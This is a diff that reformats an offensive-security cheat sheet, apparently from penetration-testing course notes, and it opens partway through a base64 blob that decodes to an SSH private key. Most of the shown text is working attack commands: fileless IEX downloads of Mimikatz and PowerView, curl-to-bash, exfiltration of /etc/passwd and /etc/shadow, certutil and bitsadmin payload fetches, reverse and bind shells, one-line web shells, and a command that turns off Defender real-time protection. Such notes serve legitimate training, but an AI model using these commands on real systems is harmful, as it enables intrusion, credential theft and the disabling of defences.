EFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
+V> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa.txt", [Convert]::FromBase64String("<BASE64_ENCODED_PRIVATE_KEY>"))
 V> Get-FileHash C:\Users\Public\id_rsa.txt -Algorithm md5
 ```
+
 ##### PowerShell Web Downloads
+
+PowerShell download methods: `OpenRead`, `OpenReadAsync`, `DownloadData`, `DownloadDataAsync`, `DownloadFile`, `DownloadFileAsync`, `DownloadString`, `DownloadStringAsync`.
+
+```powershell
+# DownloadFile — save to disk
+(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
+# DownloadFileAsync — non-blocking
+(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerViewAsync.ps1')
+
+# DownloadString — fileless execution
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+
+# Invoke-WebRequest
+Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
 ```
-- PowerSheel Download Methods:- OpenRead,OpenReadAsync,DownloadData,DownloadDataAsync,DownloadFile,DownloadFileAsync,DownloadString,DownloadStringAsync
 
-	- PowerShell DownloadFile Method - File Download:-
-		PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
-		PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:					\Users\Public\Downloads\PowerView.ps1')
+Common PowerShell download errors and fixes:
 
-		PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
-		PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:			\Users\Public\Downloads\PowerViewAsync.ps1')
+```powershell
+# If the SSL/TLS certificate cannot be validated
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
-	- PowerShell DownloadString - Fileless Method:-
-		PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/			Invoke-Mimikatz.ps1')
-		PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/				Invoke-Mimikatz.ps1') | IEX
-		PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-		PS C:\htb> read here -> https://gist.github.com/HarmJ0y/bb48307ffa663256e239
-		Common Errors with PowerShell:-
-		PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
-		PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
-		PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-		PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+# If the response cannot be parsed
+Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+
+# Upload helper
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 ```
+
+Reference: <https://gist.github.com/HarmJ0y/bb48307ffa663256e239>
+
 ##### SMB Downloads
+
 ```
 A> sudo impacket-smbserver share -smb2support /tmp/smbshare
 V> copy \\192.168.220.133\share\nc.exe
-A> sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
-V> net use n: \\192.168.220.133\share /user:test test
+A> sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
+V> net use n: \\192.168.220.133\share /user:<USER> <PASSWORD>
 
 ```
+
 ##### FTP Downloads
+
 ```
 A> sudo pip3 install pyftpdlib
 A> sudo python3 -m pyftpdlib --port 21
 V> PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
-OR
+# OR
 V> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
 V> C:\htb> echo USER anonymous >> ftpcommand.txt
 V> C:\htb> echo binary >> ftpcommand.txt
@@ -563,15 +747,19 @@ V> ftp> bye
 V> C:\htb>more file.txt
 V> This is a test file
 ```
+
 #### Upload Operations
-##### PowerShell Base64 Encode & Decode
+
+##### PowerShell Base64
+
 ```
 V> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 V> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
-A> echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2lu
-ZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
+A> echo '<BASE64_BLOB>' | base64 -d > hosts
 ```
-##### PowerShell Web Uploads 
+
+##### PowerShell Web Uploads
+
 ```
 ref:- https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
 A> pip3 install uploadserver
@@ -581,9 +769,11 @@ V> PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\
 A> nc -lvnp 8000
 V> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 V> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
-A> echo <base64> | base64 -d -w 0 > hosts
+A> echo <base64> | base64 -d > hosts
 ```
+
 ##### SMB Uploads
+
 ```
 A> sudo pip3 install wsgidav cheroot
 A> sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
@@ -591,11 +781,13 @@ V> dir \\192.168.49.128\DavWWWRoot
 V> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 V> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 ```
+
 ##### FTP Uploads
+
 ```
 A> sudo python3 -m pyftpdlib --port 21 --write
 V> PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
-OR 
+# OR
 V> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
 V> C:\htb> echo USER anonymous >> ftpcommand.txt
 V> C:\htb> echo binary >> ftpcommand.txt
@@ -607,87 +799,114 @@ V> ftp> USER anonymous
 V> ftp> PUT c:\windows\system32\drivers\etc\hosts
 V> ftp> bye
 ```
-### Linux File Transfer
+
+### Linux
+
 #### Download Operations
-##### Base64 Encoding / Decoding
+
+##### Base64
+
 ```
 A> md5sum id_rsa
 A> cat id_rsa |base64 -w 0;echo
-V>  echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3Rjbg
-pOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCtLS0tLQo=' | base64 -d > id_rsa
+V>  echo '<BASE64_ENCODED_PRIVATE_KEY>' | base64 -d > id_rsa
 V> md5sum id_rsa
 ```
-#### Web Downloads with Wget and cURL
+
+##### Wget & cURL
+
 ```
 V> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
 V> curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 V> curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 V> wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
 ```
-#### Download with Bash (/dev/tcp)
+
+##### Bash /dev/tcp
+
 ```
 V> exec 3<>/dev/tcp/10.10.10.32/80
 V> echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 V> cat <&3
 ```
-#### SSH Downloads
+
+##### SSH Downloads
+
 ```
 A> sudo systemctl enable ssh
 A> sudo systemctl start ssh
 A> netstat -lnpt
-V> scp plaintext@192.168.49.128:/root/myroot.txt . 
+V> scp plaintext@192.168.49.128:/root/myroot.txt .
 ```
+
 #### Upload Operations
-##### Web Upload
+
+##### HTTP Upload Server
+
 ```
 A> sudo python3 -m pip install --user uploadserver
-A> openssl req -x509 -out /differnetdirectory/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+A> openssl req -x509 -out /differentdirectory/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 A>  mkdir https && cd https
 A> sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 V> curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
-##### Alternative Web File Transfer Method
+
+##### Alternative HTTP Servers
+
 ```
 V> python3 -m http.server
-OR
+# OR
 V> python2.7 -m SimpleHTTPServer
-OR 
+# OR
 V> php -S 0.0.0.0:8000
-OR
+# OR
 V> ruby -run -ehttpd . -p8000
 A> wget 192.168.49.128:8000/filetotransfer.txt
 ```
+
 ##### SCP Upload
+
 ```
 V> scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
 ```
+
 ### Transferring Files with Code
-##### Python
+
+#### Python
+
 ```
 python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
-##### PHP
+
+#### PHP
+
 ```
 php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
-OR
-php -r 'const BUFFER = 1024; $fremote = 
+# OR
+php -r 'const BUFFER = 1024; $fremote =
 fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
-OR
+# OR
 php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
-##### Ruby - Download a File
+
+#### Ruby
+
 ```
 ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
 ```
-##### Perl
+
+#### Perl
+
 ```
 perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 ```
-##### JavaScript
-```
-> creat file called wget.js
-``
+
+#### JavaScript
+
+Create `wget.js` with the following contents:
+
+```javascript
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
 WinHttpReq.Send();
@@ -696,14 +915,19 @@ BinStream.Type = 1;
 BinStream.Open();
 BinStream.Write(WinHttpReq.ResponseBody);
 BinStream.SaveToFile(WScript.Arguments(1));
-``
-C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
 
+Run it:
+
+```cmd
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
 ```
-##### VBScript
-```
-> creat file called wget.vbs
-``
+
+#### VBScript
+
+Create `wget.vbs` with the following contents:
+
+```vbscript
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", WScript.Arguments.Item(0), False
@@ -715,66 +939,93 @@ with bStrm
     .write xHttp.responseBody
     .savetofile WScript.Arguments.Item(1), 2
 end with
-``
-C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
-##### Upload Operations using Python3
+
+Run it:
+
+```cmd
+cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
-A> python3 -m uploadserver 
+
+#### Python 3 Upload
+
+```
+A> python3 -m uploadserver
 A> python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
-### Miscellaneous File Transfer Methods
-#### File Transfer with Netcat and Ncat
-##### Forword file transfer
+
+### Miscellaneous
+
+#### Netcat & Ncat
+
+##### Forward File Transfer
+
 ```
 V> nc -l -p 8000 > SharpKatz.exe
-OR 
+# OR
 V> ncat -l -p 8000 --recv-only > SharpKatz.exe
 A> nc -q 0 192.168.49.128 8000 < SharpKatz.exe
-OR
+# OR
 A> ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
 ```
-##### Reverse file transfer
+
+##### Reverse File Transfer
+
 ```
 A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
 V> nc 192.168.49.128 443 > SharpKatz.exe
-OR
+# OR
 A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
 V> ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
 
 --------------------------------------------------------
 
 A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
-OR A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
+# OR
+A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
 V> cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
 ```
-##### PowerShell Session File Transfer
+
+#### PowerShell Sessions
+
 ```
 client> Test-NetConnection -ComputerName DATABASE01 -Port 5985
-OR 
+# OR
 client> $Session = New-PSSession -ComputerName DATABASE01
 client> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
 Server> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
 ```
-##### RDP
-```
-A> rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
-OR A> xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
-OR A> xfreerdp3 /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /cert:ignore /dynamic-resolution /drive:share,/PATH_TO_SHARE_FOLDER/
-V> \\tsclient\
 
-V> After selecting the drive, we can interact with it in the remote session that follows.
-<img width="1155" height="822" alt="image" src="https://github.com/user-attachments/assets/2b0efc0c-b6ad-4ce8-b49b-2ba72be8a1bb" />
+#### RDP Drive Redirection
 
+Mount a local directory inside an RDP session with the drive-redirection flag, then access it through `\\tsclient\`.
+
+```bash
+# rdesktop
+rdesktop 10.10.10.132 -d HTB -u administrator -p '<PASSWORD>' -r disk:linux='/home/user/rdesktop/files'
+
+# FreeRDP
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'<PASSWORD>' /drive:linux,/home/plaintext/htb/academy/filetransfer
+xfreerdp /v:172.16.5.35 /u:<USER> /p:'<PASSWORD>' /cert:ignore /dynamic-resolution /drive:share,/PATH_TO_SHARE_FOLDER/
 ```
+
+Inside the remote session, open `\\tsclient\` and interact with the shared folder.
+
+![RDP drive redirection](https://github.com/user-attachments/assets/2b0efc0c-b6ad-4ce8-b49b-2ba72be8a1bb)
+
 ### Protected File Transfers
-##### File Encryption on Windows
+
+#### Windows Encryption
+
+Download `Invoke-AESEncryption.ps1` from the [PowerShell Gallery](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1), then import and use it:
+
+```powershell
+Import-Module .\Invoke-AESEncryption.ps1
+Invoke-AESEncryption -Mode Encrypt -Key '<KEY>' -Path .\scan-results.txt
 ```
-by using https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
-.then > Import-Module .\Invoke-AESEncryption.ps1
-.then > Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
-```
-##### File Encryption on Linux
+
+#### Linux Encryption
+
 ```
 # Encrypting
 openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
@@ -783,96 +1034,146 @@ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
 openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 
 ```
-### Catching Files over HTTP/S
-```
-## Nginx - Enabling PUT
+
+### Receiving Files over HTTP/S
+
+This technique enables the Nginx `PUT` method so files can be uploaded with `curl -T`.
+
+#### Nginx — Enabling PUT
+
+1. Create an upload directory and give Nginx ownership:
+
+```bash
 sudo mkdir -p /var/www/uploads/SecretUploadDirectory
 sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
-sudo vim /etc/nginx/sites-available/upload.conf
-``
+```
+
+2. Add an Nginx site that enables `dav_methods PUT`:
+
+```nginx
 server {
     listen 9001;
-    
+
     location /SecretUploadDirectory/ {
         root    /var/www/uploads;
         dav_methods PUT;
     }
 }
-``
+```
+
+3. Enable the site, restart Nginx, and confirm it is listening:
+
+```bash
 sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
 sudo systemctl restart nginx.service
+sudo rm /etc/nginx/sites-enabled/default   # if the default site conflicts
+ss -lnpt | grep 9001
 tail -2 /var/log/nginx/error.log
-ss -lnpt | grep 80
-ps -ef | grep 2811
-sudo rm /etc/nginx/sites-enabled/default
-Testing uploading --> curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
-sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
 ```
-### Living off The Land
+
+4. Test the upload:
+
+```bash
+curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
 ```
-# LOLBAS
-# To search for download and upload functions in LOLBAS we can use /download or /upload.
-# Upload win.ini to our Pwnbox
-A> sudo nc -lvnp 8000
-V> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
 
-# GTFOBins
-A> openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
-A> openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
-V> openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+### Living off the Land
 
-# Other Common Living off the Land tools
-## Bitsadmin Download function
+Use built-in binaries to download or upload files without dropping tools. See LOLBAS for Windows and GTFOBins for Linux.
+
+#### LOLBAS — Certreq Upload
+
+```cmd
+:: On the attack host
+sudo nc -lvnp 8000
+
+:: On the Windows target — upload win.ini
+certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+```
+
+#### GTFOBins — OpenSSL Download
+
+```bash
+# On the attack host: serve the file over TLS
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+
+# On the target: receive the file
+openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+
+#### Bitsadmin Download
+
+```cmd
 bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
 bitsadmin /transfer myJob /download /priority high http://10.10.16.33:8000/bb.txt C:\Users\htb-student\Desktop\bb.txt
-Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
-
-# Certutil
-Download a File with Certutil
-certutil -urlcache -split -f http://10.10.10.32/nc.exe 
-certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
-
-# Transferring File with GfxDownloadWrapper.exe
-GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
-
-# otheres
-## WinHttpRequest - Client
-PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
-PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
-PS C:\htb> $h.send();
-PS C:\htb> iex $h.ResponseText
-
-## Msxml2 - Client
-PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
-PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
-PS C:\htb> $h.send();
-PS C:\htb> iex $h.responseText
-
-## BITS - Client
-PS C:\htb> Import-Module bitstransfer;
-PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
-PS C:\htb> $r=gc $env:temp\t;
-PS C:\htb> rm $env:temp\t; 
-PS C:\htb> iex $r
-
-
-
 ```
-## Shells
 
-##### Reverse Shell
+```powershell
+Import-Module bitstransfer
+Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
+#### Certutil Download
+
+```cmd
+certutil -urlcache -split -f http://10.10.10.32/nc.exe
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
+
+#### GfxDownloadWrapper Download
+
+```cmd
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+
+#### WinHttpRequest (COM)
+
+```powershell
+$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
+$h.open('GET','http://10.10.10.32/nc.exe',$false)
+$h.send()
+iex $h.ResponseText
+```
+
+#### Msxml2 (COM)
+
+```powershell
+$h = New-Object -ComObject Msxml2.XMLHTTP
+$h.open('GET','http://10.10.10.32/nc.exe',$false)
+$h.send()
+iex $h.responseText
+```
+
+#### BITS (COM)
+
+```powershell
+Import-Module bitstransfer
+Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t
+$r = gc $env:temp\t
+rm $env:temp\t
+iex $r
+```
+
+## 6. Shells
+
+### Reverse Shell
+
 ```
 # bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 # powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
-# for disable antivurs to run reverse sheel --> Set-MpPreference -DisableRealtimeMonitoring $true
+# for disable antivirus to run reverse shell --> Set-MpPreference -DisableRealtimeMonitoring $true
 # from our device $ nc -lvnp 1234
 # Ref:- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 ```
-##### Bind Shell
+
+### Bind Shell
+
 ```
 # V> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
-OR
+# OR
 # V> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
 # A> nc -nv 10.129.41.200 7777
 # python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
@@ -880,32 +1181,50 @@ OR
 # from our device, we will try to access the target machine through $nc 10.10.10.1 1234
 # Ref:- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/
 ```
-##### Web Shell
+
+### Web Shell
+
 ```
 # php --> <?php system($_REQUEST["cmd"]); ?>
 # php --> echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 # jsp --> <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 # asp --> <% eval request("cmd") %>
 ```
-##### Updating TTY 
+
+### TTY Upgrade
+
+Spawn a fully interactive TTY from a limited shell.
+
+```bash
+# Python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+python  -c 'import pty; pty.spawn("/bin/bash")'
+
+# Direct shell
+/bin/sh -i
+
+# Interpreters
+perl -e 'exec "/bin/sh";'
+ruby -e 'exec "/bin/sh"'
+lua -e 'os.execute("/bin/sh")'
+awk 'BEGIN {system("/bin/sh")}'
+
+# File-based execution
+find / -name <filename> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+find . -exec /bin/sh \; -quit
 ```
-# python -c 'import pty; pty.spawn("/bin/bash")'
-# bash /bin/sh -i
-# perl perl —e 'exec "/bin/sh";'
-# perl perl: exec "/bin/sh";
-# ruby ruby: exec "/bin/sh"
-# lua lua: os.execute('/bin/sh')
-# awk awk 'BEGIN {system("/bin/sh")}'
-# find find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
-# exec find . -exec /bin/sh \; -quit
-# vim vim -c ':!/bin/sh'
-# vim escap -->
- vim
+
+Vim escape:
+
+```vim
 :set shell=/bin/sh
 :shell
 ```
-## Password Attacks
-##### Password Mutations
+
+## 7. Password Attacks
+
+### Password Mutations
+
 ```
 # Uses cewl to generate a wordlist based on keywords present on a website.
 cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
@@ -917,7 +1236,8 @@ hashcat --force password.list -r custom.rule --stdout > mut_password.list
 ./username-anarchy -i /path/to/listoffirstandlastnames.txt
 ```
 
-##### Remote Password Attacks
+### Remote Password Attacks
+
 ```
